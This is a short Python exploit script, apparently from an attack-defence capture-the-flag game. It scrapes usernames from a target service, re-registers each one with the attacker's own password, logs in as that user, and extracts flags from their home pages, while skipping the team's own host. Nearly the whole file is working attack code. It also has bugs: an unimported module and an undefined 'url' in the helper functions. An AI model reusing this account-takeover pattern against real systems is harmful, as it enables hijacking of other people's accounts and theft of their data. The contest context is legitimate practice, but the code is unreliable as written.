#!/usr/bin/env python3

import requests
import sys
import re
import random
import json
import hashlib

flagRegEx = re.compile(r'[A-Za-z0-9]{31}=')

our_host = "10.80.3.2"		# define out host
port = 37000 				# define port of service

alph = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM0123456789'
printable = string.printable

# POST requests
# data = { 'key':'value', 'key1':'value1' }
# res = requests.post( host + "some-url", data=data )

def md5(data): return hashlib.md5(data).hexdigest()
def sha1(data): return hashlib.sha1(data).hexdigest()
def sha256(data): return hashlib.sha256(data).hexdigest()


def main():

	# do not forgot about strip(), split(), replace() - functions to parsing

	host = "10.80.4.2"				# DEBUG mode
	url = f'http://{host}:{port}/'
	
	u_name = idgen(8)
	u_pswd = idgen(12)

	# print(u_name, u_pswd)

	register(u_name, u_pswd)
	sess = login(u_name, u_pswd)
	logins = get_logins(sess)

	# print(logins)

	for u_name in logins:

		register(u_name, u_pswd)
		sess = login(u_name, u_pswd)
		home = sess.get(url).text
		flag_list = flagRegEx.findall( home )
		
		print(*flag_list, sep="\n", flush=True)
		sys.stdout.flush() 	# after print


def idgen( size = 8, chars=alph ):
	return ''.join( random.choice( chars ) for _ in range( size ) )


def register(u_name: str, u_pswd: str):
	resp = requests.post(
		url+"api/register",
		json={
			"login": u_name,
			"password": u_pswd
		}
	).text


def login(u_name: str, u_pswd: str):
	s = requests.Session()
	resp = s.post(
		url+"api/login",
		json={
		"login": u_name,
		"password": u_pswd
		}
	).text
	return s


def get_logins(s):
	logins = []
	for i in range(1, 17):
		resp = s.get(url+f"specific.html?img={str(i).zfill(2)}")
		logins += re.findall('<div class="title h5" style="margin: 20px"><b>(.*)</b></div>', resp.text)
	return logins


if __name__ == '__main__':
	
	if len(sys.argv) > 1:
		host = sys.argv[1]
	else:
		print(f"Usage: python3 {sys.argv[0]} <host>")
		sys.exit(-1)
	
	if host == our_host:
		sys.exit(-4)
	
	main()